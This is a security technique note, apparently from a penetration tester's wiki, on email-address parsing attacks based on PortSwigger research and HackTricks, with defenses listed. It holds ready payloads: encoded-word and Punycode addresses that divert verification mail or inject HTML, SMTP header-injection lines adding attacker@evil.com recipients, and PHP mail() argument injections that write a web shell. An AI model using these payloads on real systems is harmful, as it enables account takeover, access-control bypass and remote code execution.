---
title: "Email Address Parsing Attacks"
type: technique
tags: [account-takeover, auth-bypass, ssrf, xss, open-registration, web, portswigger]
phase: exploitation
date_created: 2026-06-18
date_updated: 2026-07-15
sources: [kettle-splitting-the-email-atom, hacktricks-web]
---

# Email Address Parsing Attacks

## What it is

Applications make trust decisions from email addresses (domain allowlists, SSO identity, "verified" ownership), but the **web validator**, the **mail server (MTA)**, and the **SSO provider** parse the same address differently. By crafting an address that one component reads as `attacker.com` and another reads as `company.com`, an attacker bypasses domain-based access control, takes over SSO-linked accounts, or injects payloads (XSS, SSRF) through the email field. Basis: Gareth Heyes, "Splitting the email atom: exploiting parsers to bypass access controls" (PortSwigger Research, 2024).

Core split: the validator extracts one domain, the mailer (or display layer) resolves a different one. Methodology: **probe** parser support, **observe** via a Collaborator SMTP listener, **encode** a payload, **exploit** app-specific logic.

## Techniques

### Encoded-word (RFC 2047)

Mail headers allow `=?charset?encoding?data?=` (Q-encoding hex, or Base64). Web validators usually do not decode it; many mailers (notably the Ruby `Mail` gem) do, on delivery. So the validator sees a literal string and the mailer materialises forbidden characters.

```
=?x?q?=40?=@example.com                 # =40 -> @  splits the address
=?iso-8859-1?q?_?=@company.com          # _ -> space; Postfix treats space as delimiter
```

GitHub-class split (decodes to `collab@psres.net`, escaping the SMTP `RCPT TO`):

```
"=?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net"
```

### Quoted local-parts and comments (RFC 2822)

Quotes and parenthesised comments are legal and confuse "which `@` is the delimiter".

```
"collab@psres.net"@example.com          # validator sees example.com; mailer routes to psres.net
collab%psres.net(@example.com           # ( comments out example.com; Postfix %-hack -> psres.net
```

### Unicode overflow

Apps that do unsafe codepoint-to-byte conversion (`chr()` / modulo 256) let a high Unicode character collapse into a forbidden ASCII one.

```
String.fromCodePoint(0x100 + 0x40)  # U+0140 -> 0x40 (@) after overflow
```

Bypasses `@`/character blocklists on the validator while the backend reconstructs the real character.

### Punycode / IDN abuse

Malformed Punycode (`xn--`) can decode to special characters on display while passing ASCII validation:

```
xn--0117 -> @     xn--0049 -> ,     xn--694 -> ;     xn--svg/-9x6 -> <svg/
user@xn--x-0314.example.com  ->  user@<example.com   # opening tag => HTML injection
```

### Legacy source routing (UUCP / percent-hack)

Old MTAs still honour `user!host` (UUCP), `@a,@b:user@final` (source routes), and `user%domain@relay` (percent-hack).

```
collab\@psres.net!oastify.com           # backslash-escaped @, ! triggers UUCP -> oastify.com
```

## Impact

- **Domain-allowlist bypass / privilege escalation:** register or verify as `admin@company.com` when only `@company.com` is permitted.
- **SSO account takeover:** verify an attacker-controlled mailbox while the IdP trusts the spoofed domain. Real chain - GitHub as IdP for Cloudflare Zero Trust restricted to `@company.com`: register GitHub with an encoded-word address that the `Mail` gem decodes to `attacker@company.com`, verify it, then log into Zero Trust as a `company.com` user and reach the internal network. Ties into [[account-takeover]], [[oauth-attacks]], [[saml-attacks]], [[open-redirect]].
- **XSS / RCE via the email field:** malformed Punycode rendered on display; Joomla (CVE-2024-21725) reached RCE via style-tag injection and CSS exfiltration through the email field. See [[xss]], [[dom-attacks]].
- **SSRF / OOB:** crafted addresses route mail through attacker infrastructure for interaction. See [[ssrf]].

## Affected (fixed 2024)

Joomla (CVE-2024-21725), GitHub (May 2024), GitLab Enterprise + web (Apr 2024), Zendesk (May 2024). Ruby `Mail` gem broadly affected by default encoded-word decoding.

## Testing and defense

- Probe with a Collaborator SMTP listener; PortSwigger published Hackvertor tags + Turbo Intruder scripts + a Punycode fuzzer for generating these.
- **Never authorize on the email domain alone** - verify ownership independently.
- Normalise/decode all encodings **before** extracting the domain; parse once and validate against that single representation.
- Reject non-ASCII in the domain (or apply strict IDNA); use only RFC-compliant, audited parsing libraries and confirm the validator and the MTA agree.

## SMTP header injection and PHP mail() RCE

When user input is placed into an outbound email without CRLF filtering, inject `%0A`/`%0D` to add SMTP headers and reroute or rewrite mail (add recipients, forge subject, overwrite the body). Classic sinks: contact forms, invite flows, password-reset senders.

```
From:sender@domain.com%0ACc:attacker@evil.com%0ABcc:attacker2@evil.com
From:sender@domain.com%0ATo:attacker@evil.com
From:sender@domain.com%0ASubject:Fake%20Subject
From:sender@domain.com%0A%0AInjected%20body%20replaces%20original
```

PHP `mail($to,$subj,$msg,$headers,$params)` abuse: if the 5th argument (`$additional_parameters`) is attacker-influenced, it is appended to the sendmail command line. It passes through `escapeshellcmd` (which does NOT stop argument injection), so you can inject sendmail flags to write files or reach RCE depending on the MTA (Sendmail/Postfix/Exim differ):

```
# argument-injection style payloads into $additional_parameters
-OQueueDirectory=/tmp -X/var/www/html/shell.php     # write a log-poisoned PHP file
-C/tmp/evil.cf                                        # load an attacker config (Sendmail)
```

Email-name whitelist/verification bypass for privileged-domain signups: mail servers ignore `+tag`, `-tag`, `{}`, and `(comment)` in the local part (`john.doe+x@ex.com` -> `john.doe@ex.com`), accept IP-literal domains (`user@[127.0.0.1]`, `user@[IPv6:2001:db8::1]`), and PHP `chr()` 256-overflow lets `String.fromCodePoint(0x10000+0x40)` collapse to `@`, enabling `RCPT TO:<"collab@attacker.net>collab"@target.com>` so the verification mail diverts to an attacker inbox while the account claims the victim domain.

## Sources

- Gareth Heyes, PortSwigger Research, "Splitting the email atom: exploiting parsers to bypass access controls" (2024) (slug: kettle-splitting-the-email-atom) (`https://portswigger.net/research/splitting-the-email-atom`).
- HackTricks (pentesting-web) - SMTP header injection, PHP mail() RCE (slug: hacktricks-web).
